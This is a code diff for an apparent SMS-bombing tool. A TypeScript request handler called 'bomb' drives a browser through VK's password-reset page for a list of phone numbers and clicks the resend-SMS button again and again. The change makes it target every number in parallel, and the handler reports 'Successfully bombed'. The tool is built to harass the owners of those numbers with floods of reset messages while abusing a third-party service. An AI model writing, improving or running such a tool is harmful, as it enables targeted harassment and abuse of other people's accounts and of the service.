@@ -20,8 +20,7 @@ export async function bomb(req: Request, res: Response) {
   const browser = await puppeteer.launch({ headless: false });
   console.log("Browser launched...");
   
-  for (let i = 0; i < phoneNumbers.length; i++) {
-    const phoneNumber = phoneNumbers[i];
+  const promises = phoneNumbers.map(async phoneNumber => {
     const page = await browser.newPage();
     
     await page.goto("https://id.vk.com/restore/#/resetPassword");
@@ -35,7 +34,8 @@ export async function bomb(req: Request, res: Response) {
     await clickResendSmsBtn(page);
 
     await wait(range(5000, 6000));
-  }
+  });
+  await Promise.all(promises);
   await browser.close();
 
   res.status(200).send("Successfully bombed");
